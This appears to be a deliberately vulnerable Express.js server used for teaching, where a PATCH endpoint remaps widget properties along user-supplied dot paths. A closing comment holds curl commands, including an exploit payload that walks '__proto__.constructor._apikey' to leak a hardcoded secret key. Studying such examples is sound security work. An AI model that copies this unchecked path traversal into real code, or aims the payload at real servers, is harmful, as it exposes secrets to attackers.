const express = require('express');
const bodyParser = require('body-parser')
const path = require('path');
const _ = require('lodash');

// vulnerable functions
/**
Logic to remap object properties. Useful for unifiying data structures.
It will remap object properties and can use dot syntax to flatten the object.
It will also remove properties that are not in the map
Example:
var obj = {
    id: "asdf1234",
    name: "MyObject",
    oldKey: "important information",
    oldKey2: "very important information"
},
var remap = {
    id:"id", 
    name:"name", 
    importantInfo:"oldKey", 
    veryImportantInfo:"oldKey2"
}
result = utils.remapObject(obj, {id:"id", name:"name", importantInfo:"oldKey", veryImportantInfo:"oldKey2"});

{
    id: "asdf1234",
    name: "MyObject",
    importantInfo: "important information",
    veryImportantInfo: "very important information"
}
**/
var indexItem = function(obj, i) {
    return obj[i];
};
remapObject = function(item, map) {
    var obj = {};
    _.each(map, function(value, key) {
        obj[key] = value.split(".").reduce(indexItem, item);
    });
    return obj;
};

// Constants
const PORT = 8080;
const HOST = '0.0.0.0';
const SECRET_API_KEY = 'omg_some_secret_value'

const app = express();
app.use(bodyParser.json());

let counter = 0
let widgets = {}
let Widget = class {
    static _apikey = SECRET_API_KEY;
    constructor(height, width) {
        this.height = height;
        this.width = width;
    }
};

app.put('/widget', (req, res) => {
    var body = JSON.parse(JSON.stringify(req.body));
    if(body.height && body.width) {
        let nw = new Widget(body.height, body.width)
        widgets[counter] = nw
        counter++
        res.json({id: counter-1 })
    }else {
        res.json({error:'something went wrong'})
    }
});
app.get('/widget/:id', function(req, res){
    if(req.params.id && req.params.id in widgets){
        res.json(widgets[req.params.id])
    } else {
        res.json({error:'id error'})
    }
 });

app.patch('/widget/:id', (req, res) => {
    const id = req.params.id
    var remap = JSON.parse(JSON.stringify(req.body));
    if(id && id in widgets){
        try {
            //let foo = remapObject(widgets[id], remap)
            widgets[id] = remapObject(widgets[id], remap)
            res.json(widgets[id])
        } catch(error) {
            res.json({error: error})
        }
    } else {
        res.json({'error':'id error'})
    }
})

//start
app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);

/*
curl -XPUT --header 'Content-type: application/json' -d '{"height":2.0, "width": "1.0"}' localhost:8080/widget
curl localhost:8080/widget/0
curl -XPATCH --header 'Content-type: application/json' -d '{"bar":"height","width":"width"}' localhost:8080/widget/0

curl -XPUT --header 'Content-type: application/json' -d '{"height":2.0, "width": "1.0"}' localhost:8080/widget
curl localhost:8080/widget/1
curl -XPATCH --header 'Content-type: application/json' -d '{"stolen":"__proto__.constructor._apikey"}' localhost:8080/widget/1
*/
